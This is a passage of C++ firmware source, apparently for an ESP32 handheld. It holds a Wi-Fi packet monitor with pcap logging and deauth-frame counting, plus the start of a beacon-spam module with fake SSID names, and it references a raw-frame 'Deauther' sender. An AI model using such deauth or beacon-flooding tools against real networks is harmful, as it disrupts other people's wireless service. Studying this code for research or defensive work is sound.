#include <cmath>
#include "KeyboardUI.h"
#include "SettingsStore.h"
#include "Touchscreen.h"
#include "config.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "nvs_flash.h"
#include "freertos/queue.h"
#include "freertos/task.h"
#include "icon.h"
#include "shared.h"
#include "utils.h"

// TEMP diagnostic for the Deauther STA/AP mode investigation (HANDOFF.md sec. 7).
// Remove once the fix is confirmed on serial.
#define DEAUTH_DEBUG_LOG 1

extern "C" {
#include "lwip/etharp.h"
#include "lwip/netif.h"
}

/** Active-scan dwell per channel for STA scans (Arduino default 300 ms; shared.h WIFI_SCAN_ACTIVE_MS). */
static inline uint32_t wifiStaScanMsPerChannel() {
  return (uint32_t)constrain((long)WIFI_SCAN_ACTIVE_MS, 120L, 1500L);
}

namespace Deauther {
  extern void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size);
}

#ifdef TFT_BLACK
#undef TFT_BLACK
#endif
#define TFT_BLACK FEATURE_BG

#ifndef FEATURE_TEXT
#define FEATURE_TEXT ORANGE
#endif
#ifndef FEATURE_WHITE
#define FEATURE_WHITE 0xFFFF
#endif

#ifdef TFT_WHITE
#undef TFT_WHITE
#endif
#define TFT_WHITE FEATURE_TEXT

#ifdef WHITE
#undef WHITE
#endif
#define WHITE FEATURE_WHITE

#ifdef DARK_GRAY
#undef DARK_GRAY
#endif
#define DARK_GRAY UI_FG

static constexpr int kWifiScreenH = 320;
static constexpr int kWifiBodyTop = 37;

static int wifiContentBottom() {
  return featureHasTouchNavBar() ? touchNavContentBottomY() : kWifiScreenH;
}

static int wifiMaxLinesInZone(int contentTop, int lineHeight) {
  const int h = wifiContentBottom() - contentTop;
  if (h <= 0 || lineHeight <= 0) {
    return 1;
  }
  return h / lineHeight;
}

static void wifiClearBody(uint16_t color = TFT_BLACK) {
  const int bottom = wifiContentBottom();
  if (bottom > kWifiBodyTop) {
    tft.fillRect(0, kWifiBodyTop, tft.width(), bottom - kWifiBodyTop, color);
  }
}

static int wifiListBottomY() {
  return wifiContentBottom() - 4;
}

namespace PacketMonitor {

/** Toolbar / meter strip fills (0x4208); file-level DARK_GRAY is remapped to UI_FG for text. */
static constexpr uint16_t kPtmToolbarBg = 0x4208;

static bool s_ptmHwReady = false;

#define MAX_CH 14
#define SNAP_LEN ESP32DIV_PCAP_SNAP_LEN

static constexpr uint32_t PCAP_MAGIC_USEC = 0xa1b2c3d4;
static constexpr uint16_t PCAP_VER_MAJOR = 2;
static constexpr uint16_t PCAP_VER_MINOR = 4;
static constexpr uint32_t PCAP_SNAPLEN   = 65535;
static constexpr uint32_t PCAP_DLT_IEEE802_11_RADIO = 127;

static constexpr uint16_t RADIOTAP_LEN = 19;
static constexpr uint32_t RADIOTAP_PRESENT =
  (1u << 1) |
  (1u << 3) |
  (1u << 5) |
  (1u << 11) |
  (1u << 19);

struct __attribute__((packed)) RadiotapHdr16 {
  uint8_t  it_version;
  uint8_t  it_pad;
  uint16_t it_len;
  uint32_t it_present;
  uint8_t  flags;
  uint8_t  pad2;
  uint16_t chan_freq;
  uint16_t chan_flags;
  int8_t   dbm_antsignal;
  uint8_t  antenna;
  uint8_t  mcs_known;
  uint8_t  mcs_flags;
  uint8_t  mcs;
};

struct __attribute__((packed)) PcapGlobalHeader {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
};

struct __attribute__((packed)) PcapRecordHeader {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

static bool  pcapEnabled = false;
static bool  pcapMounted = false;
static File  pcapFile;
static String pcapPath;
static uint32_t pcapPacketsWritten = 0;
static uint32_t pcapDropped = 0;
static uint32_t pcapLastFlushMs = 0;

static constexpr uint8_t PCAP_POOL_SIZE = ESP32DIV_PCAP_POOL_SIZE;
struct PcapSlot {
  PcapRecordHeader hdr;
  uint16_t caplen;
  uint8_t  data[SNAP_LEN + RADIOTAP_LEN];
};
#if BOARD_HAS_ESP32S3
static PcapSlot pcapPoolStorage[PCAP_POOL_SIZE];
static PcapSlot* pcapPool = pcapPoolStorage;
#else
// Classic ESP32: keep ~1.6KB+ out of .bss; allocate only when PCAP logging starts.
static PcapSlot* pcapPool = nullptr;
#endif
static QueueHandle_t pcapFreeQ = nullptr;
static QueueHandle_t pcapWriteQ = nullptr;

static bool pcapMountSD() {
  if (pcapMounted) {
    if (SD.cardType() != CARD_NONE) return true;
    pcapMounted = false;
  }
  pcapMounted = isSDCardAvailable();
  return pcapMounted;
}

static bool pcapEnsureDir(const char* dirPath) {
  if (!pcapMountSD()) return false;
  if (SD.exists(dirPath)) return true;
  if (SD.mkdir(dirPath)) return true;
  if (dirPath && dirPath[0] == '/') return SD.mkdir(dirPath + 1);
  return false;
}

static bool pcapMakeNextPath(String& outPath) {

  for (uint16_t i = 0; i < 10000; i++) {
    char buf[64];
    snprintf(buf, sizeof(buf), "%s/ptm_%04u.pcap", CAPTURE_DIR, (unsigned)i);
    if (!SD.exists(buf)) { outPath = String(buf); return true; }
  }
  return false;
}

static void pcapDisableAndCloseFile() {
  pcapEnabled = false;

  if (pcapWriteQ && pcapFreeQ) {
    uint8_t slotIdx;
    while (xQueueReceive(pcapWriteQ, &slotIdx, 0) == pdTRUE) {
      xQueueSend(pcapFreeQ, &slotIdx, 0);
    }
  }

  if (pcapFile) {
    pcapFile.flush();
    pcapFile.close();
  }
  pcapPath = "";
}

static void pcapStop() {
  pcapDisableAndCloseFile();

  if (pcapWriteQ) { vQueueDelete(pcapWriteQ); pcapWriteQ = nullptr; }
  if (pcapFreeQ)  { vQueueDelete(pcapFreeQ);  pcapFreeQ  = nullptr; }

  pcapPacketsWritten = 0;
  pcapDropped = 0;
  pcapLastFlushMs = 0;
}

static void pcapStart() {

  pcapStop();

  if (!pcapEnsureDir(CAPTURE_DIR)) return;
  if (!pcapMakeNextPath(pcapPath)) return;

  pcapFile = SD.open(pcapPath.c_str(), FILE_WRITE);
  if (!pcapFile) { pcapPath = ""; return; }

  PcapGlobalHeader gh{};
  gh.magic_number = PCAP_MAGIC_USEC;
  gh.version_major = PCAP_VER_MAJOR;
  gh.version_minor = PCAP_VER_MINOR;
  gh.thiszone = 0;
  gh.sigfigs = 0;
  gh.snaplen = PCAP_SNAPLEN;
  gh.network = PCAP_DLT_IEEE802_11_RADIO;
  if (pcapFile.write((const uint8_t*)&gh, sizeof(gh)) != sizeof(gh)) {
    pcapFile.close();
    pcapPath = "";
    return;
  }

  pcapFreeQ = xQueueCreate(PCAP_POOL_SIZE, sizeof(uint8_t));
  pcapWriteQ = xQueueCreate(PCAP_POOL_SIZE, sizeof(uint8_t));
  if (!pcapFreeQ || !pcapWriteQ) {
    pcapStop();
    return;
  }

#if !BOARD_HAS_ESP32S3
  if (!pcapPool) {
    pcapPool = (PcapSlot*)malloc(sizeof(PcapSlot) * PCAP_POOL_SIZE);
    if (!pcapPool) {
      pcapStop();
      return;
    }
  }
#endif

  for (uint8_t i = 0; i < PCAP_POOL_SIZE; i++) {
    xQueueSend(pcapFreeQ, &i, 0);
  }

  pcapEnabled = true;
  pcapLastFlushMs = millis();
}

static void ptmEnsureNvs() {
  esp_err_t ret = nvs_flash_init();
  if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret = nvs_flash_init();
  }
  if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE) {
    ESP_ERROR_CHECK(ret);
  }
}

static void ptmStartRadioAndPcapOnce() {
  ptmEnsureNvs();

  wifi_mode_t wm = WIFI_MODE_NULL;
  const esp_err_t gm = esp_wifi_get_mode(&wm);
  if (gm == ESP_ERR_WIFI_NOT_INIT) {
    tcpip_adapter_init();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_err_t err = esp_wifi_init(&cfg);
    if (err != ESP_OK) {
      Serial.printf("[ptm] wifi_init failed: %s\n", esp_err_to_name(err));
      return;
    }
    err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
    if (err != ESP_OK) {
      Serial.printf("[ptm] set_storage failed: %s\n", esp_err_to_name(err));
      return;
    }
    err = esp_wifi_set_mode(WIFI_MODE_NULL);
    if (err != ESP_OK) {
      Serial.printf("[ptm] set_mode failed: %s\n", esp_err_to_name(err));
      return;
    }
    err = esp_wifi_start();
    if (err != ESP_OK) {
      Serial.printf("[ptm] wifi_start failed: %s\n", esp_err_to_name(err));
      return;
    }
  } else if (gm != ESP_OK) {
    Serial.printf("[ptm] get_mode failed: %s\n", esp_err_to_name(gm));
    return;
  } else {
    const esp_err_t sm = esp_wifi_set_mode(WIFI_MODE_NULL);
    if (sm != ESP_OK) {
      Serial.printf("[ptm] set_mode failed: %s\n", esp_err_to_name(sm));
      return;
    }
  }

  pcapStart();
  if (pcapEnabled && pcapPath.length()) {
    Serial.printf("[PCAP] PacketMonitor logging to SD: %s\n", pcapPath.c_str());
  } else {
    Serial.println("[PCAP] PacketMonitor: SD/PCAP logging not started (no SD or open failed).");
  }
}

static uint16_t pcapChannelToFreqMHz(uint8_t channel) {
  if (channel == 14) return 2484;
  if (channel >= 1 && channel <= 13) return (uint16_t)(2407 + channel * 5);

  if (channel >= 32) return (uint16_t)(5000 + channel * 5);
  return 0;
}

static uint16_t pcapChannelFlags(uint16_t freqMHz) {

  if (freqMHz >= 2400 && freqMHz < 2500) return 0x0080;
  if (freqMHz >= 4900 && freqMHz < 6000) return 0x0100;
  return 0;
}

#define MAX_X ESP32DIV_PKT_GRAPH_WIDTH
#define MAX_Y 320

arduinoFFT FFT = arduinoFFT();

bool btnLeftPressed = false;
bool btnRightPressed = false;

Preferences preferences;

const uint16_t samples = ESP32DIV_FFT_SAMPLES;
const double samplingFrequency = 5000;

double attenuation = 10;

unsigned int sampling_period_us;
unsigned long microseconds;

double vReal[samples];
double vImag[samples];

byte palette_red[ESP32DIV_FFT_PALETTE_SIZE], palette_green[ESP32DIV_FFT_PALETTE_SIZE],
     palette_blue[ESP32DIV_FFT_PALETTE_SIZE];

bool buttonPressed = false;
bool buttonEnabled = true;
uint32_t lastDrawTime;
uint32_t lastButtonTime;
uint32_t tmpPacketCounter;
uint32_t pkts[MAX_X];
uint32_t deauths = 0;
unsigned int ch = 1;
int rssiSum;

unsigned int epoch = 0;
unsigned int color_cursor = 2016;

void do_sampling_FFT() {

  microseconds = micros();

  for (int i = 0; i < samples; i++) {
    vReal[i] = tmpPacketCounter * 300;
    vImag[i] = 1;
    while (micros() - microseconds < sampling_period_us) {

    }
    microseconds += sampling_period_us;
  }

  double mean = 0;

  for (uint16_t i = 0; i < samples; i++)
    mean += vReal[i];
  mean /= samples;
  for (uint16_t i = 0; i < samples; i++)
    vReal[i] -= mean;

  microseconds = micros();

  FFT.Windowing(vReal, samples, FFT_WIN_TYP_HAMMING, FFT_FORWARD);
  FFT.Compute(vReal, vImag, samples, FFT_FORWARD);
  FFT.ComplexToMagnitude(vReal, vImag, samples);

  // Original layout: mirrored waterfall centered at x=120 (full ~240px width with 256-pt FFT).
  unsigned int left_x = 120;
  unsigned int graph_y_offset = 91;
  int max_k = 0;

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > max_k)
      max_k = k;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    unsigned int vertical_x = left_x + j;
    const int plotY = epoch + graph_y_offset;
    if (plotY < wifiContentBottom()) {
      tft.drawPixel(vertical_x, plotY, color);
    }
  }

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > max_k)
      max_k = k;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    unsigned int mirrored_x = left_x - j;
    const int plotY = epoch + graph_y_offset;
    if (plotY < wifiContentBottom()) {
      tft.drawPixel(mirrored_x, plotY, color);
    }
  }

  unsigned int area_graph_x_offset = 120;
  unsigned int area_graph_height = 50;
  unsigned int area_graph_y_offset = 38;

  static int last_y[samples >> 1] = {0};
  tft.fillRect(area_graph_x_offset, area_graph_y_offset, (samples >> 1), area_graph_height, TFT_BLACK);

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    int current_y = area_graph_height
              - (int)::map(k, 0, 127, 0, area_graph_height)
              + area_graph_y_offset;
    unsigned int x = area_graph_x_offset + j;

    if (j > 0) {
      tft.fillTriangle(x - 1, area_graph_y_offset + area_graph_height, x, area_graph_y_offset + area_graph_height, x - 1, last_y[j - 1], color);
      tft.fillTriangle(x - 1, last_y[j - 1], x, area_graph_y_offset + area_graph_height, x, current_y, color);
    }
    last_y[j] = current_y;
  }

  unsigned int area_graph_width = (samples >> 1);
  int area_graph_x_offset_flipped = (int)left_x - (int)area_graph_width;
  if (area_graph_x_offset_flipped < 0) {
    area_graph_x_offset_flipped = 0;
  }

  tft.fillRect((unsigned)area_graph_x_offset_flipped, area_graph_y_offset, area_graph_width, area_graph_height, TFT_BLACK);

  for (int j = 0; j < samples >> 1; j++) {
    int k = vReal[j] / attenuation;
    if (k > 127) k = 127;

    unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
    int current_y = area_graph_height
              - (int)::map(k, 0, 127, 0, area_graph_height)
              + area_graph_y_offset;
    unsigned int x = (unsigned)area_graph_x_offset_flipped + area_graph_width - j - 1;

    if (j > 0) {
      tft.fillTriangle(x + 1, area_graph_y_offset + area_graph_height, x, area_graph_y_offset + area_graph_height, x + 1, last_y[j - 1], color);
      tft.fillTriangle(x + 1, last_y[j - 1], x, area_graph_y_offset + area_graph_height, x, current_y, color);
    }
    last_y[j] = current_y;
  }

  double tattenuation = max_k / 127.0;

  if (tattenuation > attenuation)
    attenuation = tattenuation;

  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.setTextFont(1);

  tft.fillRect(30, 20, 130, 16, kPtmToolbarBg);

  tft.setCursor(35, 24);
  tft.print("Ch:");
  tft.print(ch);

  tft.setCursor(80, 24);
  tft.print("Packet:");
  tft.print(tmpPacketCounter);

  delay(10);
}

esp_err_t event_handler(void* ctx, system_event_t* event) {
  return ESP_OK;
}

double getMultiplicator() {
  uint32_t maxVal = 1;
  for (int i = 0; i < MAX_X; i++) {
    if (pkts[i] > maxVal) maxVal = pkts[i];
  }
  if (maxVal > MAX_Y) return (double)MAX_Y / (double)maxVal;
  else return 1;
}

void wifi_promiscuous(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;

  if (type == WIFI_PKT_MGMT && (pkt->payload[0] == 0xA0 || pkt->payload[0] == 0xC0 )) deauths++;

  if (type == WIFI_PKT_MISC) return;
  if (ctrl.sig_len > SNAP_LEN) return;

  const uint16_t packetLength = (uint16_t)ctrl.sig_len;
  tmpPacketCounter++;
  rssiSum += ctrl.rssi;

  if (!pcapEnabled || !pcapFile || !pcapFreeQ || !pcapWriteQ || !pcapPool) return;

  uint8_t slotIdx;
  if (xQueueReceive(pcapFreeQ, &slotIdx, 0) != pdTRUE) {
    pcapDropped++;
    return;
  }

  if (slotIdx >= PCAP_POOL_SIZE) {

    pcapDropped++;
    return;
  }

  PcapSlot& s = pcapPool[slotIdx];

  const int64_t nowUs = esp_timer_get_time();
  s.hdr.ts_sec  = (uint32_t)(nowUs / 1000000LL);
  s.hdr.ts_usec = (uint32_t)(nowUs % 1000000LL);

  const uint16_t freq = pcapChannelToFreqMHz((uint8_t)ctrl.channel);
  RadiotapHdr16 rt{};
  rt.it_version = 0;
  rt.it_pad = 0;
  rt.it_len = RADIOTAP_LEN;
  rt.it_present = RADIOTAP_PRESENT;
  rt.flags = 0;
  rt.pad2 = 0;
  rt.chan_freq = freq;
  rt.chan_flags = pcapChannelFlags(freq);
  rt.dbm_antsignal = (int8_t)ctrl.rssi;
  rt.antenna = 0;
  rt.mcs_known = 0;
  rt.mcs_flags = 0;
  rt.mcs = 0;

  if (ctrl.sig_mode == 1) {

    rt.mcs_known =
      (1u << 0) |
      (1u << 1) |
      (1u << 2) |
      (1u << 4) |
      (1u << 5);

    const uint8_t bw = (ctrl.cwb ? 1 : 0);
    rt.mcs_flags |= (bw & 0x3);
    if (ctrl.sgi) rt.mcs_flags |= (1u << 2);
    if (ctrl.fec_coding) rt.mcs_flags |= (1u << 4);
    if (ctrl.stbc) rt.mcs_flags |= (1u << 5);

    rt.mcs = ctrl.mcs;
  }

  const uint16_t totalLen = (uint16_t)(RADIOTAP_LEN + packetLength);
  s.hdr.incl_len = totalLen;
  s.hdr.orig_len = totalLen;
  s.caplen = totalLen;
  memcpy(s.data, &rt, RADIOTAP_LEN);
  memcpy(s.data + RADIOTAP_LEN, pkt->payload, packetLength);

  if (xQueueSend(pcapWriteQ, &slotIdx, 0) != pdTRUE) {

    xQueueSend(pcapFreeQ, &slotIdx, 0);
    pcapDropped++;
    return;
  }
}

void setChannel(int newChannel) {
  ch = newChannel;
  if (ch > MAX_CH || ch < 1) ch = 1;

  preferences.begin("packetmonitor32", false);
  preferences.putUInt("channel", ch);
  preferences.end();

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous);
  esp_wifi_set_promiscuous(true);
}

void draw() {
  double multiplicator = getMultiplicator();
  int len;
  int rssi;

  if (pkts[MAX_X - 1] > 0) rssi = rssiSum / (int)pkts[MAX_X - 1];
  else rssi = rssiSum;
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

  static int iconX[ICON_NUM] = {170, 210, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_sort_up_plus,
    bitmap_icon_sort_down_minus,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, kPtmToolbarBg);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 2) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();

                switch (i) {
                  case 0: setChannel(ch + 1); break;
                  case 1: setChannel(ch - 1); break;
                }
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

static void ptmDrawWaitCard() {
  constexpr int kPad = 14;
  constexpr int kRadius = 8;
  constexpr int kBodyTop = 40;
  const int contentBottom = touchNavContentBottomY();
  const int bodyH = contentBottom - kBodyTop;
  if (bodyH > 0) {
    tft.fillRect(0, kBodyTop, tft.width(), bodyH, TFT_BLACK);
  }

  const int cardW = tft.width() - 2 * kPad;
  const int cardH = 96;
  const int cardX = kPad;
  int cardY = kBodyTop + (bodyH - cardH) / 2;
  if (cardY < kBodyTop + 4) {
    cardY = kBodyTop + 4;
  }

  tft.fillRoundRect(cardX, cardY, cardW, cardH, kRadius, UI_FG);
  tft.drawRoundRect(cardX, cardY, cardW, cardH, kRadius, UI_LINE);

  constexpr int kTitleH = 26;
  tft.drawFastHLine(cardX + 8, cardY + kTitleH, cardW - 16, UI_LINE);

  tft.setTextDatum(MC_DATUM);
  tft.setTextFont(2);
  tft.setTextColor(FEATURE_TEXT, UI_FG);
  tft.drawString("Please Wait", cardX + cardW / 2, cardY + 14);

  tft.setTextFont(1);
  tft.setTextColor(UI_TEXT, UI_FG);
  tft.drawString("802.11 monitor - standby", cardX + cardW / 2, cardY + 44);
  tft.setTextColor(UI_WARN, UI_FG);
  tft.drawString("Initializing [do not exit]", cardX + cardW / 2, cardY + 62);
  tft.setTextDatum(TL_DATUM);
  tft.setTextFont(1);
  tft.setTextSize(1);
  tft.setTextColor(UI_TEXT, FEATURE_BG);
}

void ptmSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  // Layout remapeado: LEFT=Exit, UP=Ch+, DOWN=Ch-, SELECT e RIGHT livres.
  setTouchNavLabels("Exit", "Ch-", nullptr, "Ch+", nullptr);
  s_ptmHwReady = false;

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
#endif

  featureClearContent(TFT_BLACK);

  {
    float vBat = currentBatteryVoltage;
    if (vBat < 0.05f) {
      vBat = readBatteryVoltage();
    }
    drawStatusBar(vBat, true);
  }
  redrawTouchButtonBar();

  setupTouchscreen();

  sampling_period_us = round(1000000 * (1.0 / samplingFrequency));

  for (int i = 0; i < 32; i++) {
    palette_red[i] = i / 2;
    palette_green[i] = 0;
    palette_blue[i] = i;
  }
  for (int i = 32; i < 64; i++) {
    palette_red[i] = i / 2;
    palette_green[i] = 0;
    palette_blue[i] = 63 - i;
  }
#if ESP32DIV_FFT_PALETTE_SIZE > 64
  for (int i = 64; i < 96; i++) {
    palette_red[i] = 31;
    palette_green[i] = (i - 64) * 2;
    palette_blue[i] = 0;
  }
  for (int i = 96; i < 128; i++) {
    palette_red[i] = 31;
    palette_green[i] = 63;
    palette_blue[i] = i - 96;
  }
#endif

  preferences.begin("packetmonitor32", false);
  ch = preferences.getUInt("channel", 1);
  preferences.end();

  uiDrawn = false;
  runUI();

  /* Radio + PCAP init runs on first loop; show a short wait hint on the body. */
  ptmDrawWaitCard();
  redrawTouchButtonBar();
}

void ptmLoop() {

  if (!s_ptmHwReady) {
    ptmStartRadioAndPcapOnce();
    s_ptmHwReady = true;
    constexpr int kPtmWaitBodyTop = 40;
    const int bodyH = wifiContentBottom() - kPtmWaitBodyTop;
    if (bodyH > 0) {
      tft.fillRect(0, kPtmWaitBodyTop, tft.width(), bodyH, TFT_BLACK);
    }
  }

  // Layout remapeado: fisico LEFT sai (em vez do SELECT do meio). O slot da
  // barra de toque que mostra "Exit" agora e o da ESQUERDA (ver ptmSetup) --
  // isButtonPressed(BTN_LEFT) ja cobre esse toque sozinho (fisico OU touch
  // nav no mesmo slot); nao precisa somar isTouchNavButtonPressed(BTN_SELECT),
  // que agora e um slot livre (sem label) e nao deveria sair a tela ao tocar.
  if (feature_active && isButtonPressed(BTN_LEFT)) {

    esp_wifi_set_promiscuous(false);
    if (pcapPacketsWritten || pcapDropped) {
      Serial.printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
                    (unsigned long)pcapPacketsWritten, (unsigned long)pcapDropped);
    }
    pcapStop();
    feature_exit_requested = true;
    return;
  }

  runUI();
  if (feature_exit_requested) {
    esp_wifi_set_promiscuous(false);
    if (pcapPacketsWritten || pcapDropped) {
      Serial.printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
                    (unsigned long)pcapPacketsWritten, (unsigned long)pcapDropped);
    }
    pcapStop();
    return;
  }
  updateStatusBar();

  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous);
  esp_wifi_set_promiscuous(true);

  if (pcapEnabled && pcapFile && pcapWriteQ && pcapFreeQ) {
    uint8_t slotIdx;

    uint16_t drained = 0;
    while (drained < 12 && xQueueReceive(pcapWriteQ, &slotIdx, 0) == pdTRUE) {
      if (slotIdx < PCAP_POOL_SIZE) {
        PcapSlot& s = pcapPool[slotIdx];
        const size_t wroteHdr = pcapFile.write((const uint8_t*)&s.hdr, sizeof(s.hdr));
        const size_t wrotePkt = pcapFile.write(s.data, s.caplen);
        if (wroteHdr == sizeof(s.hdr) && wrotePkt == s.caplen) {
          pcapPacketsWritten++;
        } else {

          pcapDisableAndCloseFile();
        }
      }
      xQueueSend(pcapFreeQ, &slotIdx, 0);
      drained++;
    }

    const uint32_t now = millis();
    if (pcapFile && (now - pcapLastFlushMs) > 1000) {
      pcapFile.flush();
      pcapLastFlushMs = now;
    }
  }

  tft.drawFastHLine(0, 90, 240, UI_LINE);
  tft.drawFastHLine(0, 19, 240, UI_LINE);

  do_sampling_FFT();
  delay(10);
  epoch++;

  if (epoch >= tft.width())
    epoch = 0;

  static uint32_t lastButtonTime = 0;
  const uint32_t debounceDelay = 200;

  // Layout remapeado: fisico DOWN = Ch- (antes era o LEFT), fisico UP = Ch+
  // (antes era o RIGHT). LEFT ficou livre pra sair (ver checagem de exit
  // acima) e RIGHT ficou sem funcao nesta tela.
  bool leftButtonState = isButtonPressed(BTN_DOWN);
  bool rightButtonState = isButtonPressed(BTN_UP);

  uint32_t currentTime = millis();

  if (leftButtonState && !btnLeftPressed && (currentTime - lastButtonTime > debounceDelay)) {
    btnLeftPressed = true;
    setChannel(ch - 1);
    lastButtonTime = currentTime;
  } else if (!leftButtonState) {
    btnLeftPressed = false;
  }

  if (rightButtonState && !btnRightPressed && (currentTime - lastButtonTime > debounceDelay)) {
    btnRightPressed = true;
    setChannel(ch + 1);
    lastButtonTime = currentTime;
  } else if (!rightButtonState) {
    btnRightPressed = false;
  }

  pkts[MAX_X - 1] = tmpPacketCounter;

  tmpPacketCounter = 0;
  deauths = 0;
  rssiSum = 0;
  }
}

namespace BeaconSpammer {

bool btnLeftPress;
bool btnRightPress;
bool btnSelectPress;
bool btnDownPress;

static const char* ssidList[] = {
  "404_SSID_Not_Found", "Free_WiFi_Promise", "PrettyFlyForAWiFi", "Wi-Fight_The_Power",
  "Tell_My_WiFi_LoveHer", "Wu-Tang_LAN", "LAN_of_the_Free", "No_More_Data",
  "Panic!_At_the_WiFi", "HideYoKidsHideYoWiFi", "Definitely_Not_A_Spy", "Click_and_Die",
  "DropItLikeItsHotspot", "Loading...", "I_AM_Watching_You", "Why_Tho?",
  "Get_Your_Own_WiFi", "NSA_Surveillance_Van", "WiFi_Fairy", "Undercover_Potato",
  "TheLANBeforeTime", "ItHurtsWhen_IP", "IPFreely", "NoInternetHere",
  "LookMaNoCables", "Router?IHardlyKnewHer", "ShutUpAndConnect", "Mom_UseThisOne",
  "Not_for_You", "OopsAllSSID", "ItsOver9000", "Bob's_Wifi_Burgers",
  "Overclocked_Toaster", "Pikachu_Used_WiFi", "Cheese_Bandit", "Quantum_Tunnel",
  "Meme_LANd"
};

static const int ssidCount = sizeof(ssidList) / sizeof(ssidList[0]);

// ── Custom SSID list from SD (/ssid_list.txt) ──────────────────────────────
// Optional: one SSID per line (<=32 chars, blank lines ignored). When present
// with >=1 valid name it replaces the built-in array; otherwise we fall back
// to ssidList[] above. SD is mounted via the shared isSDCardAvailable() helper
// so the SPI-bus hand-off (SD shares the bus with the NRF24 radio) is honored.
#ifndef BEACON_SD_MAX_SSIDS
#define BEACON_SD_MAX_SSIDS 64
#endif
static String s_sdSsids[BEACON_SD_MAX_SSIDS];
static int    s_sdSsidCount = 0;
static bool   s_usingSdList = false;

static inline int activeSsidCount() {
  return s_usingSdList ? s_sdSsidCount : ssidCount;
}
static inline const char* activeSsid(int i) {
  return s_usingSdList ? s_sdSsids[i].c_str() : ssidList[i];
}

// Returns number of names loaded from SD (0 = keep built-in list).
static int loadSsidListFromSd() {
  s_usingSdList = false;
  s_sdSsidCount = 0;

  if (!isSDCardAvailable()) {
    Serial.println("[Beacon] SD not available; using built-in SSID list");
    return 0;
  }
  if (!SD.exists("/ssid_list.txt")) {
    Serial.println("[Beacon] /ssid_list.txt not found; using built-in SSID list");
    return 0;
  }
  File f = SD.open("/ssid_list.txt", FILE_READ);
  if (!f) {
    Serial.println("[Beacon] could not open /ssid_list.txt; using built-in list");
    return 0;
  }

  int n = 0;
  while (f.available() && n < BEACON_SD_MAX_SSIDS) {
    String line = f.readStringUntil('\n');
    line.replace("\r", "");
    line.trim();
    if (line.length() == 0) continue;
    if (line.length() > 32) line = line.substring(0, 32);
    s_sdSsids[n++] = line;
  }
  f.close();

  if (n >= 1) {
